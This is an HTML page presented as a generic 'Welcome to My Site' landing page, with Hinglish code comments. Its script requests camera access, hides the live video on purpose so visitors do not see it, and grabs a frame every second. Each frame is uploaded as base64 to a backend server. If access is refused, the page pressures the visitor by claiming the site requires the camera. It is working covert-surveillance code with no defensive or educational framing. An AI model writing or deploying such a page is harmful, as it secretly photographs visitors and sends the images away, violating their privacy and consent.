<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to My Site</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
        /* Video element ko chupa dega taki user ko na dikhe */
        #video-preview { display: none; } 
        canvas { display: none; }
    </style>
</head>
<body>

    <h1>Welcome!</h1>
    <p id="status">Please wait, starting camera...</p>

    <!-- Video stream yahan aayega -->
    <video id="video-preview" autoplay></video>
    <!-- Photo capture karne ke liye Canvas -->
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video-preview');
        const canvas = document.getElementById('canvas');
        const statusEl = document.getElementById('status');
        const backendUrl = 'http://localhost:3000/upload'; // Aapka backend server URL

        // 1. User se Camera access ke liye permission maango
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                statusEl.textContent = "Camera access granted. Capturing photo...";
                video.srcObject = stream;
                
                // Har 1 second mein photo capture karke bhejo
                // **WARNING: Yeh aapke browser aur server ko slow kar sakta hai!**
                setInterval(() => {
                    captureAndSend();
                }, 1000); // 1000 milliseconds = 1 second
            })
            .catch(err => {
                console.error("Camera access error:", err);
                statusEl.textContent = "Could not access the camera. Please allow camera permission.";
                alert("You denied camera access. This site requires camera to function.");
            });

        // 2. Photo capture karke backend ko bhejne wala function
        function captureAndSend() {
            const context = canvas.getContext('2d');
            
            // Canvas ka size video ke barabar set karo
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Video ka current frame canvas par draw karo
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Canvas se image data ko Base64 format mein nikalo
            const imageData = canvas.toDataURL('image/jpeg');
            
            // 3. Image data ko server par bhejo
            fetch(backendUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Server response:', data.message);
            })
            .catch(error => {
                console.error('Error sending image to server:', error);
            });
        }
    </script>
</body>
</html>
